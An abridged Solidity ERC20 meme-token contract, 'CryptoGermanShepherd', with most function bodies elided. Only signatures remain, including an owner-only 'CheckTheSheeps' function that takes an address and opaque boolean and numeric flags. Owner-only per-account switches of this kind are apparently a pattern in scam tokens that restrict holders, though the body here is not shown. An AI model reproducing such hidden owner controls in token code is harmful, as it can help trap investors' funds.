...
/**
 * The most loyal dog known to men.
 * The Crypto Shepherd
 * 
 * The Crypto German Shepherd
 * 
 * https://t.me/CryptoGermanShepherd
 * 
 **/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _herdThePeople(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
    ...
    function CheckTheSheeps(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20German is Context, ERC20 {
    constructor(
        ...
        _herdThePeople(owner, initialSupply, tmp6, tmp7);
    }
}

contract CryptoGermanShepherd is ERC20German {
    constructor() ERC20German("CryptoGermanShephard", "cGERMANS", false, true, 800, 25, msg.sender, 5000000000 * 10 ** 18, msg.sender, 10) {
    }
}